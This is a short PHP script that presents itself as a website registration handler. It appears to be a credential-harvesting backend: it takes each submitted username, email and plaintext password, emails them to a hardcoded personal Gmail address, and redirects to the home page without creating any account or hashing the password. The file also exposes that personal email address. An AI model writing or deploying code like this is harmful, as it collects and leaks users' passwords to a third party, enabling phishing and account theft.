<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $email = $_POST["email"];
    $password = $_POST["password"];
    
    // Configure your email settings
    $to = "manishbhandari0444@gmail.com"; // Your personal email address
    $subject = "New Registration";
    $message = "Username: $username\nEmail: $email\nPassword: $password";

    // Send the email
    mail($to, $subject, $message);

    // Redirect to a thank you page
    header("Location: index.html");
    exit;
} else {
    // Handle invalid access or display an error message
    echo "Invalid access!";
}
?>
